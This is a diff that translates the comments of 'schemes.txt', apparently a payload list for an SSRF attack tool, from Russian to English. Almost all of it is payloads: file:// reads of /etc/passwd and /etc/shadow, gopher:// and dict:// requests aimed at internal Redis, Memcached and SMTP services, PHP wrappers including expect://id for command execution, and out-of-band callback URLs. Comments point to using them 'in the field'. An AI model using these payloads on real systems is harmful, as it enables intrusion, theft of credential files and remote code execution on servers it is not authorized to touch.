@@ -1,11 +1,11 @@
 # schemes.txt
-# Альтернативные протоколы/обёртки для SSRF (режим -mode ssrf).
-# Опасность: при SSRF, который дёргает URL целиком, эти схемы дают чтение файлов,
-# обращение к внутренним сервисам (Redis/Memcached/FastCGI) и даже RCE.
-# Плейсхолдеры: {{OOB}}, {{LHOST}}, {{TARGET}}
-# Строки с # и пустые игнорируются.
+# Alternative protocols / wrappers for SSRF (-mode ssrf).
+# Danger: when SSRF fetches a full URL, these schemes allow file reads,
+# hitting internal services (Redis/Memcached/FastCGI), even RCE.
+# Placeholders: {{OOB}}, {{LHOST}}, {{TARGET}}
+# Lines starting with # and blank lines are ignored.
 
-# ---------- file:// (локальное чтение) ----------
+# ---------- file:// (local read) ----------
 file:///etc/passwd
 file:///etc/hosts
 file:///etc/shadow
@@ -17,8 +17,8 @@ file:///c:/windows/win.ini
 file://\/\/etc/passwd
 file:/etc/passwd
 
-# ---------- gopher:// (smuggling произвольных TCP-пакетов) ----------
-# Redis пример: выполнить PING (дальше в бою генеришь нужный payload URL-энкодом)
+# ---------- gopher:// (smuggling arbitrary TCP packets) ----------
+# Redis example: run PING (craft the real payload URL-encoded in the field)
 gopher://127.0.0.1:6379/_%0d%0aPING%0d%0a
 gopher://127.0.0.1:6379/_PING
 gopher://{{TARGET}}:6379/_INFO
@@ -26,14 +26,14 @@ gopher://127.0.0.1:11211/_stats
 gopher://127.0.0.1:25/_HELO%20localhost
 gopher://{{OOB}}:80/_GET
 
-# ---------- dict:// (опрос сервисов, баннеры) ----------
+# ---------- dict:// (probing services, banners) ----------
 dict://127.0.0.1:6379/INFO
 dict://127.0.0.1:6379/stats
 dict://127.0.0.1:11211/stats
 dict://{{TARGET}}:22/
 dict://127.0.0.1:3306/
 
-# ---------- Прочие опасные обёртки ----------
+# ---------- Other dangerous wrappers ----------
 ftp://127.0.0.1/
 ftp://{{OOB}}/
 sftp://{{OOB}}/
@@ -43,12 +43,12 @@ ldap://{{TARGET}}:389/
 jar:http://{{OOB}}!/
 netdoc:///etc/passwd
 
-# ---------- PHP wrappers (если SSRF ведёт в include) ----------
+# ---------- PHP wrappers (if SSRF reaches an include) ----------
 php://filter/convert.base64-encode/resource=/etc/passwd
 php://filter/read=string.rot13/resource=index.php
 data://text/plain;base64,SSBsb3ZlIFBIUAo=
 expect://id
 
-# ---------- Protocol-relative / без схемы ----------
+# ---------- Protocol-relative / schemeless ----------
 //{{OOB}}
 //127.0.0.1
